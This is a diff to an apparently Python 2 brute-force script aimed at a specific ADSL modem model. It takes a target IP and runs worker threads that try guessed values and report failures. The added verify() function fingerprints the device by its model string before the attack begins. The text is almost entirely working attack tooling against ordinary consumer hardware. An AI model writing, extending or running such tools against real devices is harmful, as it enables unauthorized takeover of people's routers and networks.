@@ -13,7 +13,7 @@ if len(sys.argv)== 2:
 else:
     print 'Usage: {} TARGET_IP'.format(sys.argv[0])
     sys.exit(2)
-    
+
 queue = Queue.Queue()
 threads = []
 
@@ -43,6 +43,18 @@ class BruteThread(threading.Thread):
             else:
                 print "\r\033[91m[-] Attempt failed. TEST: {}, RESULT: {}\033[0m".format(dapw, 'Failed')
             self.queue.task_done()
+
+def verify(target):
+    try:
+        r = requests.get('http://'+target+'/')
+    except ConnectionError, e:
+        print "\r\033[91m[-] Target Modem Down\033[0m"
+        sys.exit(2)
+    if 'Modem model: ADSL-RIGER-DB120WL' not in r.text:
+        print "\r\033[91m[-] Target Modem model not supported.\033[0m"
+        sys.exit(2)
+
+verify(target)
 
 for i in range(1,10):
     worker = BruteThread(queue,i)
